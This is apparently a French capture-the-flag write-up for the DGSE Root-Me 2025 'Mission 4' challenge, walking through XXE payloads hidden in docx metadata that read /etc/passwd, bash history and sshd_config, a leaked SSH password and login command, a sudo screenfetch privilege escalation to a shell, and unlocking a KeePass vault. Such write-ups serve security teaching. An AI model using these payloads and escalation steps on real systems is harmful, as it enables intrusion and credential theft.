

<!DOCTYPE html>
<html class="writer-html5" lang="fr" data-content_root="../../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mission 4 &mdash; Documentation Kubow WU 1</title>
      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=80d5e7a1" />
      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />

  
      <script src="../../_static/jquery.js?v=5d32c60e"></script>
      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script src="../../_static/documentation_options.js?v=a12a2fe1"></script>
      <script src="../../_static/doctools.js?v=9bcbadda"></script>
      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
      <script src="../../_static/translations.js?v=e6b791cb"></script>
    <script src="../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Recherche" href="../../search.html" />
    <link rel="next" title="Mission 5" href="Mission5.html" />
    <link rel="prev" title="Mission 3" href="Mission3.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../../index.html" class="icon icon-home">
            Kubow WU
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Rechercher docs" aria-label="Rechercher docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Liste des CTFs :</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2024/_index.html">Midnight Flag 2024</a></li>
<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2025/_index.html">Midnight Flag 2025</a></li>
<li class="toctree-l1"><a class="reference internal" href="../404ctf-2024/_index.html">404CTF 2024</a></li>
<li class="toctree-l1"><a class="reference internal" href="../404ctf-2025/_index.html">404CTF 2025</a></li>
<li class="toctree-l1"><a class="reference internal" href="../HTB-Apocalypse-2025/_index.html">HTB Apocalypse 2024</a></li>
<li class="toctree-l1"><a class="reference internal" href="../FCSC-2025/_index.html">FCSC 2025</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="_index.html">DGSE Root-Me 2025</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="Mission1.html">Mission 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="Mission2.html">Mission 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="Mission3.html">Mission 3</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">Mission 4</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#enonce">Enonce</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#brief-de-mission">Brief de mission</a></li>
<li class="toctree-l4"><a class="reference internal" href="#objectifs-de-la-mission">Objectifs de la mission</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#web-exploit">Web Exploit</a></li>
<li class="toctree-l3"><a class="reference internal" href="#privesc-1">Privesc 1</a></li>
<li class="toctree-l3"><a class="reference internal" href="#obtenir-le-flag">Obtenir le flag</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="Mission5.html">Mission 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="Mission-finale.html">Mission finale</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../Hackosint-2025/_index.html">Hackosint 2025</a></li>
<li class="toctree-l1"><a class="reference internal" href="../shutlock-2025/_index.html">Shutlock 2025</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Kubow WU</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
          <li class="breadcrumb-item"><a href="_index.html">DGSE Root-Me 2025</a></li>
      <li class="breadcrumb-item active">Mission 4</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../_sources/ctf/DGSE-Root-Me-2025/Mission4.rst.txt" rel="nofollow"> Afficher la source de la page</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="mission-4">
<h1>Mission 4<a class="headerlink" href="#mission-4" title="Lien vers cette rubrique"></a></h1>
<section id="enonce">
<h2>Enonce<a class="headerlink" href="#enonce" title="Lien vers cette rubrique"></a></h2>
<section id="brief-de-mission">
<h3>Brief de mission<a class="headerlink" href="#brief-de-mission" title="Lien vers cette rubrique"></a></h3>
<p>L’une de vos équipes de renseignement a réussi à identifier une application qui fait partie de la chaîne d’attaque de l’entité.</p>
</section>
<section id="objectifs-de-la-mission">
<h3>Objectifs de la mission<a class="headerlink" href="#objectifs-de-la-mission" title="Lien vers cette rubrique"></a></h3>
<p>Réaliser une intrusion sur l’application web hébergée par le serveur attaquant.
Récupérer les plans d’attaque de l’entité.</p>
</section>
</section>
<section id="web-exploit">
<h2>Web Exploit<a class="headerlink" href="#web-exploit" title="Lien vers cette rubrique"></a></h2>
<p>Le serveur permet d’upload un fichier docx.
Le premier upload permet d’ajouter un victimID dans les fichiers XML du docx.
Le second upload permet de lire ce victimID</p>
<p>On va donc tenter la XXE, qui fonctionne directement.</p>
<ul class="simple">
<li><p>Payload 1 :</p></li>
</ul>
<div class="highlight-xml notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span>]&gt;
<span class="nt">&lt;Properties</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties&quot;</span><span class="w"> </span><span class="na">xmlns:vt=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes&quot;</span><span class="nt">&gt;&lt;Template&gt;</span>Normal.dotm<span class="nt">&lt;/Template&gt;&lt;TotalTime&gt;</span>0<span class="nt">&lt;/TotalTime&gt;&lt;Pages&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/Pages&gt;&lt;Words&gt;</span>0<span class="nt">&lt;/Words&gt;&lt;Characters&gt;</span>4<span class="nt">&lt;/Characters&gt;&lt;Application&gt;</span>Microsoft<span class="w"> </span>Office<span class="w"> </span>Word<span class="nt">&lt;/Application&gt;&lt;DocSecurity&gt;</span>0<span class="nt">&lt;/DocSecurity&gt;&lt;Lines&gt;</span>1<span class="nt">&lt;/Lines&gt;&lt;Paragraphs&gt;</span>1<span class="nt">&lt;/Paragraphs&gt;&lt;ScaleCrop&gt;</span>false<span class="nt">&lt;/ScaleCrop&gt;&lt;Company&gt;</span>Reply<span class="nt">&lt;/Company&gt;&lt;LinksUpToDate&gt;</span>false<span class="nt">&lt;/LinksUpToDate&gt;&lt;CharactersWithSpaces&gt;</span>4<span class="nt">&lt;/CharactersWithSpaces&gt;&lt;VictimID&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/VictimID&gt;&lt;SharedDoc&gt;</span>false<span class="nt">&lt;/SharedDoc&gt;&lt;HyperlinksChanged&gt;</span>false<span class="nt">&lt;/HyperlinksChanged&gt;&lt;AppVersion&gt;</span>16.0000<span class="nt">&lt;/AppVersion&gt;&lt;/Properties&gt;</span>
</pre></div>
</div>
<ul class="simple">
<li><p>/etc/passwd :</p></li>
</ul>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">root               : x :    0 :    0 : root                         : /root                 : /bin/bash</span>
<span class="go">daemon             : x :    1 :    1 : daemon                       : /usr/sbin             : /usr/sbin/nologin</span>
<span class="go">bin                : x :    2 :    2 : bin                          : /bin                  : /usr/sbin/nologin</span>
<span class="go">sys                : x :    3 :    3 : sys                          : /dev                  : /usr/sbin/nologin</span>
<span class="go">sync               : x :    4 :65534 : sync                         : /bin                  : /bin/sync</span>
<span class="go">games              : x :    5 :   60 : games                        : /usr/games            : /usr/sbin/nologin</span>
<span class="go">man                : x :    6 :   12 : man                          : /var/cache/man        : /usr/sbin/nologin</span>
<span class="go">lp                 : x :    7 :    7 : lp                           : /var/spool/lpd        : /usr/sbin/nologin</span>
<span class="go">mail               : x :    8 :    8 : mail                         : /var/mail             : /usr/sbin/nologin</span>
<span class="go">news               : x :    9 :    9 : news                         : /var/spool/news       : /usr/sbin/nologin</span>
<span class="go">uucp               : x :   10 :   10 : uucp                         : /var/spool/uucp       : /usr/sbin/nologin</span>
<span class="go">proxy              : x :   13 :   13 : proxy                        : /bin                  : /usr/sbin/nologin</span>
<span class="go">www-data           : x :   33 :   33 : www-data                     : /var/www              : /usr/sbin/nologin</span>
<span class="go">backup             : x :   34 :   34 : backup                       : /var/backups          : /usr/sbin/nologin</span>
<span class="go">list               : x :   38 :   38 : Mailing List Manager         : /var/list             : /usr/sbin/nologin</span>
<span class="go">irc                : x :   39 :   39 : ircd                         : /run/ircd             : /usr/sbin/nologin</span>
<span class="go">_apt               : x :   42 :65534 :                              : /nonexistent          : /usr/sbin/nologin</span>
<span class="go">nobody             : x :65534 :65534 : nobody                       : /nonexistent          : /usr/sbin/nologin</span>
<span class="go">systemd-network    : x :  998 :  998 : systemd Network Management   : /                     : /usr/sbin/nologin</span>
<span class="go">systemd-timesync   : x :  997 :  997 : systemd Time Synchronization : /                     : /usr/sbin/nologin</span>
<span class="go">messagebus         : x :  100 :  101 :                              : /nonexistent          : /usr/sbin/nologin</span>
<span class="go">sshd               : x :  101 :65534 :                              : /run/sshd             : /usr/sbin/nologin</span>
<span class="go">document-user      : x :  999 :  996 :                              : /home/document-user   : /bin/sh</span>
<span class="go">executor           : x :  996 :  995 :                              : /home/executor        : /bin/bash</span>
<span class="go">administrator      : x :  995 :  994 :                              : /home/administrator   : /bin/bash</span>
</pre></div>
</div>
<ul class="simple">
<li><p>Payload 2 :</p></li>
</ul>
<div class="highlight-xml notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;</span>]&gt;
<span class="nt">&lt;Properties</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties&quot;</span><span class="w"> </span><span class="na">xmlns:vt=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes&quot;</span><span class="nt">&gt;&lt;Template&gt;</span>Normal.dotm<span class="nt">&lt;/Template&gt;&lt;TotalTime&gt;</span>0<span class="nt">&lt;/TotalTime&gt;&lt;Pages&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/Pages&gt;&lt;Words&gt;</span>0<span class="nt">&lt;/Words&gt;&lt;Characters&gt;</span>4<span class="nt">&lt;/Characters&gt;&lt;Application&gt;</span>Microsoft<span class="w"> </span>Office<span class="w"> </span>Word<span class="nt">&lt;/Application&gt;&lt;DocSecurity&gt;</span>0<span class="nt">&lt;/DocSecurity&gt;&lt;Lines&gt;</span>1<span class="nt">&lt;/Lines&gt;&lt;Paragraphs&gt;</span>1<span class="nt">&lt;/Paragraphs&gt;&lt;ScaleCrop&gt;</span>false<span class="nt">&lt;/ScaleCrop&gt;&lt;Company&gt;</span>Reply<span class="nt">&lt;/Company&gt;&lt;LinksUpToDate&gt;</span>false<span class="nt">&lt;/LinksUpToDate&gt;&lt;CharactersWithSpaces&gt;</span>4<span class="nt">&lt;/CharactersWithSpaces&gt;&lt;VictimID&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/VictimID&gt;&lt;SharedDoc&gt;</span>false<span class="nt">&lt;/SharedDoc&gt;&lt;HyperlinksChanged&gt;</span>false<span class="nt">&lt;/HyperlinksChanged&gt;&lt;AppVersion&gt;</span>16.0000<span class="nt">&lt;/AppVersion&gt;&lt;/Properties&gt;</span>
</pre></div>
</div>
<ul class="simple">
<li><p>/etc/hosts :</p></li>
</ul>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00:: ip6-localnet ff00:: ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters 172.18.0.2 document-station</span>
</pre></div>
</div>
<p>On a tester l’accès a document-station mais c’est le serveur lui même, donc inutile.
On va donc tester tous les .bash_history de tous les utilisateurs</p>
<p>Payload 3 :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span>
<span class="go">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;/home/document-user/.bash_history&quot; &gt;]&gt;</span>
<span class="go">&lt;Properties xmlns=&quot;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties&quot; xmlns:vt=&quot;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes&quot;&gt;&lt;Template&gt;Normal.dotm&lt;/Template&gt;&lt;TotalTime&gt;0&lt;/TotalTime&gt;&lt;Pages&gt;&amp;xxe;&lt;/Pages&gt;&lt;Words&gt;0&lt;/Words&gt;&lt;Characters&gt;4&lt;/Characters&gt;&lt;Application&gt;Microsoft Office Word&lt;/Application&gt;&lt;DocSecurity&gt;0&lt;/DocSecurity&gt;&lt;Lines&gt;1&lt;/Lines&gt;&lt;Paragraphs&gt;1&lt;/Paragraphs&gt;&lt;ScaleCrop&gt;false&lt;/ScaleCrop&gt;&lt;Company&gt;Reply&lt;/Company&gt;&lt;LinksUpToDate&gt;false&lt;/LinksUpToDate&gt;&lt;CharactersWithSpaces&gt;4&lt;/CharactersWithSpaces&gt;&lt;VictimID&gt;&amp;xxe;&lt;/VictimID&gt;&lt;SharedDoc&gt;false&lt;/SharedDoc&gt;&lt;HyperlinksChanged&gt;false&lt;/HyperlinksChanged&gt;&lt;AppVersion&gt;16.0000&lt;/AppVersion&gt;&lt;/Properties&gt;</span>
</pre></div>
</div>
<p>/home/document-user/.bash_history :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">id</span>
<span class="go">htop</span>
<span class="go">cat /etc/passwd</span>
<span class="go">sudo su</span>
<span class="go">ps aux | grep python</span>
<span class="go">rm -rf /tmp/*</span>
<span class="go">ip --brief --color a</span>
<span class="go">whoami</span>
<span class="go">uname -a</span>
<span class="go">cat /plans/next-op.txt</span>
<span class="go">ls /var/log/</span>
<span class="go">vim .bashrc</span>
<span class="go">ls -la</span>
<span class="go">cd /app</span>
<span class="go">python3 app.py</span>
<span class="go">pip install -r requirements.txt</span>
<span class="go">export FLASK_ENV=production</span>
<span class="go">flask run --host=0.0.0.0 --port=5000</span>
<span class="go">echo &quot;cABdTXRyUj5qgAEl0Zc0a&quot; &gt;&gt; /tmp/exec_ssh_password.tmp</span>
<span class="go">ps aux | grep flask</span>
<span class="go">cd templates/</span>
<span class="go">vim index.html</span>
<span class="go">vim app.py</span>
<span class="go">export SECRET_KEY=$(head -n50 /dev/null | xxd | sha256sum | awk &#39;{print $1}&#39;)</span>
<span class="go">grep -RiF &quot;docx&quot; .</span>
<span class="go">ls -la /tmp/</span>
<span class="go">vim README.md</span>
<span class="go">clear</span>
<span class="go">ls -lah /tmp</span>
<span class="go">exit</span>
<span class="go">vim /etc/hosts</span>
</pre></div>
</div>
<p>Le fichier /plans/next-op.txt n’existe pas.
Par contre on un a mot de passe SSH : cABdTXRyUj5qgAEl0Zc0a</p>
<p>Mais le SSH n’existe pas sur le port 22, on va donc récupéré le fichier de config ssh</p>
<p>Payload 4</p>
<div class="highlight-xml notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/ssh/sshd_config&quot; &gt;</span>]&gt;
<span class="nt">&lt;Properties</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/extended-properties&quot;</span><span class="w"> </span><span class="na">xmlns:vt=</span><span class="s">&quot;http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes&quot;</span><span class="nt">&gt;&lt;Template&gt;</span>Normal.dotm<span class="nt">&lt;/Template&gt;&lt;TotalTime&gt;</span>0<span class="nt">&lt;/TotalTime&gt;&lt;Pages&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/Pages&gt;&lt;Words&gt;</span>0<span class="nt">&lt;/Words&gt;&lt;Characters&gt;</span>4<span class="nt">&lt;/Characters&gt;&lt;Application&gt;</span>Microsoft<span class="w"> </span>Office<span class="w"> </span>Word<span class="nt">&lt;/Application&gt;&lt;DocSecurity&gt;</span>0<span class="nt">&lt;/DocSecurity&gt;&lt;Lines&gt;</span>1<span class="nt">&lt;/Lines&gt;&lt;Paragraphs&gt;</span>1<span class="nt">&lt;/Paragraphs&gt;&lt;ScaleCrop&gt;</span>false<span class="nt">&lt;/ScaleCrop&gt;&lt;Company&gt;</span>Reply<span class="nt">&lt;/Company&gt;&lt;LinksUpToDate&gt;</span>false<span class="nt">&lt;/LinksUpToDate&gt;&lt;CharactersWithSpaces&gt;</span>4<span class="nt">&lt;/CharactersWithSpaces&gt;</span>
<span class="nt">&lt;VictimID&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/VictimID&gt;&lt;SharedDoc&gt;</span>false<span class="nt">&lt;/SharedDoc&gt;&lt;HyperlinksChanged&gt;</span>false<span class="nt">&lt;/HyperlinksChanged&gt;&lt;AppVersion&gt;</span>16.0000<span class="nt">&lt;/AppVersion&gt;&lt;/Properties&gt;</span>
</pre></div>
</div>
<p>Truncate /etc/ssh/sshd_config :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">This is the sshd server system-wide configuration file. See</span>

<span class="gp"># </span>sshd_config<span class="o">(</span><span class="m">5</span><span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>more<span class="w"> </span>information.
<span class="gp"># </span>This<span class="w"> </span>sshd<span class="w"> </span>was<span class="w"> </span>compiled<span class="w"> </span>with<span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/usr/local/bin:/usr/bin:/bin:/usr/games
<span class="gp"># </span>The<span class="w"> </span>strategy<span class="w"> </span>used<span class="w"> </span><span class="k">for</span><span class="w"> </span>options<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>default<span class="w"> </span>sshd_config<span class="w"> </span>shipped<span class="w"> </span>with
<span class="gp"># </span>OpenSSH<span class="w"> </span>is<span class="w"> </span>to<span class="w"> </span>specify<span class="w"> </span>options<span class="w"> </span>with<span class="w"> </span>their<span class="w"> </span>default<span class="w"> </span>value<span class="w"> </span>where
<span class="gp"># </span>possible,<span class="w"> </span>but<span class="w"> </span>leave<span class="w"> </span>them<span class="w"> </span>commented.<span class="w"> </span>Uncommented<span class="w"> </span>options<span class="w"> </span>override<span class="w"> </span>the
<span class="gp"># </span>default<span class="w"> </span>value.
<span class="go">nclude /etc/ssh/sshd_config.d/*.conf</span>
<span class="go">Port 22222</span>
</pre></div>
</div>
<p>On peut donc se connecter au serveur avec ssh <a class="reference external" href="mailto:executor&#37;&#52;&#48;163&#46;172&#46;67&#46;183">executor<span>&#64;</span>163<span>&#46;</span>172<span>&#46;</span>67<span>&#46;</span>183</a> -p 22222</p>
<p>Et le mot de passe : cABdTXRyUj5qgAEl0Zc0a</p>
</section>
<section id="privesc-1">
<h2>Privesc 1<a class="headerlink" href="#privesc-1" title="Lien vers cette rubrique"></a></h2>
<p>Une fois sur le serveur, on voit que le système est en read-only, cela limite les possibilités
Cependant il est tout de même possible d’écrire dans /dev/shm</p>
<p>On va tout de suite faire un sudo -l :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Matching Defaults entries for executor on document-station:</span>
<span class="go">env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span>

<span class="go">User executor may run the following commands on document-station:</span>
<span class="go">    (administrator) NOPASSWD: /usr/bin/screenfetch</span>
</pre></div>
</div>
<p>On peut lancer screenfetch en tant qu’administrator.</p>
<p>Dans le screenfetch -h on trouve un argument intéressant :</p>
<dl class="simple">
<dt>-a “PATH”          You can specify a custom ASCII art by passing the path</dt><dd><p>to a Bash script, defining <cite>startline</cite> and <cite>fulloutput</cite>
variables, and optionally <cite>labelcolor</cite> and <cite>textcolor</cite>.
See the <cite>asciiText</cite> function in the source code for more</p>
</dd>
</dl>
<p>On peut donc créer un script bash avec /bin/bash et faire :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo -u administrator screenfetch -a /dev/shm/evil.sh</span>
</pre></div>
</div>
<p>Contenu du script  :</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">startline=1</span>
<span class="go">fulloutput=&quot;dumping app.py&quot;</span>
<span class="go">/bin/bash</span>
</pre></div>
</div>
</section>
<section id="obtenir-le-flag">
<h2>Obtenir le flag<a class="headerlink" href="#obtenir-le-flag" title="Lien vers cette rubrique"></a></h2>
<p>Maintenant on a accès au user administrator
Il y a deux fichiers intéressant dans le /home/administrator :</p>
<ul class="simple">
<li><p>vault.kdbx</p></li>
<li><p>logo.jpg</p></li>
</ul>
<p>Pour les récupérer en local :</p>
<ul class="simple">
<li><p>On les affiche en base64 et on les copie colle sur notre machine et on décode le base64.</p></li>
</ul>
<p>Pour ouvrir le fichier vault.kdbx :</p>
<ul class="simple">
<li><p>CVE : a priori rien ne correspond</p></li>
<li><p>Bruteforce : rockyou n’a pas suffit</p></li>
<li><p>Mot de passe :</p></li>
<li><p>Celui du SSH == KO</p></li>
<li><p>Les données exifs de l’image « VullVastation secret » == KO</p></li>
<li><p>Le logo en tant que fichier clé == Bingo !</p></li>
</ul>
<p>On a maintenant accès au vault.kdbx</p>
<p>Il y a un une entrée « OPERATION NOTES » dont le mot de passe est le flag !</p>
<p>Flag : <strong>RM{f5289180cb760ca5416760f3ca7ec80cd09bc1c3}</strong></p>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Pied de page">
        <a href="Mission3.html" class="btn btn-neutral float-left" title="Mission 3" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Précédent</a>
        <a href="Mission5.html" class="btn btn-neutral float-right" title="Mission 5" accesskey="n" rel="next">Suivant <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Droits d'auteur 2025, Kubow.</p>
  </div>

  Compilé avec <a href="https://www.sphinx-doc.org/">Sphinx</a> en utilisant un
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">thème</a>
    fourni par <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>